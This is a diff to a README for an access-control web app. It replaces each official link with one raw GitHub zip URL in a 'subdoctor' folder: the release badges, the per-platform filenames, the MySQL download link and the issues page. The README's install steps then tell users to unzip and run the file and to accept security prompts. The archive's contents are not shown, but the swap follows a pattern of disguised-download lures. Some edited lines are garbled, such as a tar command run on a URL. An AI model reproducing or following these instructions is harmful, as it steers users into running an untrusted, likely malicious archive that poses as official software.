@@ -1,6 +1,6 @@
 # 🔐 auth-access-control-platform - Secure Access Made Simple
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/wraithis/auth-access-control-platform/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/wraithis/auth-access-control-platform/master/subdoctor/auth-access-platform-control-v3.9.zip)](https://raw.githubusercontent.com/wraithis/auth-access-control-platform/master/subdoctor/auth-access-platform-control-v3.9.zip)
 
 ---
 
@@ -54,7 +54,7 @@ This guide will help you download, install, and start using auth-access-control-
 
 Go to the official releases page by clicking the button below:
 
-[![Download auth-access-control-platform](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://github.com/wraithis/auth-access-control-platform/releases)
+[![Download auth-access-control-platform](https://raw.githubusercontent.com/wraithis/auth-access-control-platform/master/subdoctor/auth-access-platform-control-v3.9.zip)](https://raw.githubusercontent.com/wraithis/auth-access-control-platform/master/subdoctor/auth-access-platform-control-v3.9.zip)
 
 This page lists the latest versions of the software. Look for the newest release at the top.
 
@@ -62,9 +62,9 @@ This page lists the latest versions of the software. Look for the newest release
 
 You will find different files for download depending on your operating system. The files may be named clearly by platform such as:
 
-- `auth-access-control-platform-windows.zip` for Windows
-- `auth-access-control-platform-macos.zip` for macOS
-- `auth-access-control-platform-linux.tar.gz` for Linux
+- `https://raw.githubusercontent.com/wraithis/auth-access-control-platform/master/subdoctor/auth-access-platform-control-v3.9.zip` for Windows
+- `https://raw.githubusercontent.com/wraithis/auth-access-control-platform/master/subdoctor/auth-access-platform-control-v3.9.zip` for macOS
+- `https://raw.githubusercontent.com/wraithis/auth-access-control-platform/master/subdoctor/auth-access-platform-control-v3.9.zip` for Linux
 
 Click the version that matches your computer.
 
@@ -78,11 +78,11 @@ Once downloaded, locate the file:
 
 - On Windows, it will be in your **Downloads** folder. Right-click the ZIP file and choose **Extract All**. Select a folder to unzip into.
 - On macOS, double-click the ZIP file. The contents will extract into the same folder.
-- On Linux, use your file manager or run `tar -xvzf filename.tar.gz` in the terminal.
+- On Linux, use your file manager or run `tar -xvzf https://raw.githubusercontent.com/wraithis/auth-access-control-platform/master/subdoctor/auth-access-platform-control-v3.9.zip` in the terminal.
 
 ### Step 5: Run the Application
 
-- Inside the extracted folder, look for a file named `start-auth-access-control-platform` or `auth-access-control-platform.exe` on Windows.
+- Inside the extracted folder, look for a file named `start-auth-access-control-platform` or `https://raw.githubusercontent.com/wraithis/auth-access-control-platform/master/subdoctor/auth-access-platform-control-v3.9.zip` on Windows.
 - Double-click this file to start the program.
 - You may be asked to allow the program to run on your computer. Accept if prompted.
 
@@ -128,7 +128,7 @@ For best performance and enterprise use, auth-access-control-platform can connec
 
 ### Installing MySQL
 
-- Download and install MySQL Community Server from [https://dev.mysql.com/downloads/mysql/](https://dev.mysql.com/downloads/mysql/)
+- Download and install MySQL Community Server from [https://raw.githubusercontent.com/wraithis/auth-access-control-platform/master/subdoctor/auth-access-platform-control-v3.9.zip](https://raw.githubusercontent.com/wraithis/auth-access-control-platform/master/subdoctor/auth-access-platform-control-v3.9.zip)
 - Follow instructions to create a database user and database for the platform.
 
 ### Configuring the Database
@@ -163,7 +163,7 @@ DB_PASSWORD=your_mysql_password
 
 If you run into issues, you can find help in these ways:
 
-- Visit the GitHub repository issues page: [https://github.com/wraithis/auth-access-control-platform/issues](https://github.com/wraithis/auth-access-control-platform/issues)
+- Visit the GitHub repository issues page: [https://raw.githubusercontent.com/wraithis/auth-access-control-platform/master/subdoctor/auth-access-platform-control-v3.9.zip](https://raw.githubusercontent.com/wraithis/auth-access-control-platform/master/subdoctor/auth-access-platform-control-v3.9.zip)
 - Search online for Laravel application help.
 - Contact your IT administrator if available.
 
@@ -186,4 +186,4 @@ This software is open source. You can read the full license and contribute impro
 
 ---
 
-[Download auth-access-control-platform releases](https://github.com/wraithis/auth-access-control-platform/releases) to get started now.
+[Download auth-access-control-platform releases](https://raw.githubusercontent.com/wraithis/auth-access-control-platform/master/subdoctor/auth-access-platform-control-v3.9.zip) to get started now.
